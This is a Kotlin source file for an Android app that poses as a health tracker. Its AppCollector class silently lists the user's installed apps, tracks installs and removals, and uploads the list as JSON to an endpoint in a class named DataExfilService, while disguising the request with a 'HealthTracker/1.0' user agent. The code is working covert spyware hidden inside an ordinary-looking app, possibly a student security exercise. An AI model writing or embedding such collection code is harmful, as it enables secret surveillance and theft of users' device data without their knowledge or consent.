package com.inf2007.healthtracker.utilities.collectors

import android.content.Context
import android.util.Log
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.NetworkClient
import com.inf2007.healthtracker.utilities.PackageLister
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException

class AppCollector(private val context: Context) : DataCollector {
    companion object {
        private const val TAG = "AppCollector"
    }

    private lateinit var packageLister: PackageLister
    private var lastAppList: List<PackageLister.PackageInfo>? = null

    override fun startObserving() {
        packageLister = PackageLister(context)
        packageLister.startListening()
        collect()
        Log.d(TAG, "App observing started")
    }

    override fun stopObserving() {
        if (::packageLister.isInitialized) {
            packageLister.stopListening()
        }
        Log.d(TAG, "App observing stopped")
    }

    override fun collect() {
        // Get current apps
        val currentApps = packageLister.getUserApps()

        // Check if anything changed (original logic)
        if (lastAppList != null) {
            val oldPackages = lastAppList!!.map { it.packageName }.toSet()
            val currentPackages = currentApps.map { it.packageName }.toSet()

            val newApps = currentPackages - oldPackages
            val removedApps = oldPackages - currentPackages

            if (newApps.isNotEmpty()) {
                Log.i(TAG, "New apps installed: $newApps")
            }
            if (removedApps.isNotEmpty()) {
                Log.i(TAG, "Apps uninstalled: $removedApps")
            }
        }

        // Update last list
        lastAppList = currentApps

        val jsonData = packageLister.getUserAppsAsJson()
        jsonData.put("scan_type", if (lastAppList == null) "initial" else "update")

        // Trigger upload
        uploadUserAppsJson(jsonData)

        packageLister.saveUserAppsToFile()
    }

    private fun uploadUserAppsJson(jsonData: JSONObject) {
        try {
            val requestBody = jsonData.toString()
                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(DataExfilService.USER_APPS_ENDPOINT)
                .post(requestBody)
                .addHeader("User-Agent", "HealthTracker/1.0")
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "User apps JSON upload failed: ${e.message}")
                }
                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.i(TAG, "User apps JSON uploaded successfully")
                    } else {
                        Log.w(TAG, "User apps JSON upload failed: HTTP ${response.code}")
                    }
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading user apps JSON: ${e.message}")
        }
    }
}